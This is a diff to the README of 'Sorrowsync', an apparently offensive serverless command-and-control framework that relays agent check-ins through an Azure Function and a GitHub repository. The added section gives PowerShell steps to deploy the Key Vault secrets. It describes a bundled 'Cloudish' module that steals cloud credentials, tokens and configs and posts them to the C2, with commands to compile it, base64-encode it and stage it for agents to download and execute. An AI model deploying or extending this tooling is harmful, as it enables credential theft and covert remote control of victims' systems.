@@ -81,11 +81,35 @@ $Ip = ''
 
 <br>
 
-#### Sorrowsync - Deploy Function and configure Networking
+#### Sorrowsync - Deploy KeyVault,s Function and Configure
 
-Serverless C2 API, requires keyVault and managed Identity or access policy. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.
+Serverless C2 API/redirector, requires keyVault and managed Identity or access policy. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.
 
 xHooktoken is your agent's client api key, the other tokens are server-side api keys.
+
+##### Deploy Keyvault with Secrets
+```powershell
+$vaultName = ""
+$location = ""
+$groupname = ""
+
+# will prompt for values of the secrets needed for redirector
+.\Scripts\Gen-Keyvault.ps1 -Vaultname $vaultName -locationname $location -groupname $groupname 
+```
+
+##### Modules
+Included is one module 'Cloudish' which steals cloud credentials, tokens, configs, etc and posts to the C2. Compile it as a dll, then base64 encode and upload the txt file into 'assets'
+
+```powershell
+cd Modules\CloudishModule
+dotnet build -c Release .
+cd .\bin\release
+base64.exe -n 0 -i .\cloudish.dll -o cloudish.txt
+```
+
+Put processed modules and other DLLs as base64 encoded text files aka 'roadtoken.txt' in 'assets' folder in root of the repo. The /assets/ route can be used to pull down libraries or execute tools, just compile them as dlls and add <Module>.Modes namespace, <moduleName> Class and Execute() method that does what you want. Create a new 'elseif' in the agent's Main method to handle the invocation f the new module and add new method calls as needed.
+
+
 
 ***TODO: Pull the blocklist and user agent blocks from the phishing functions and implement it in this project.
 
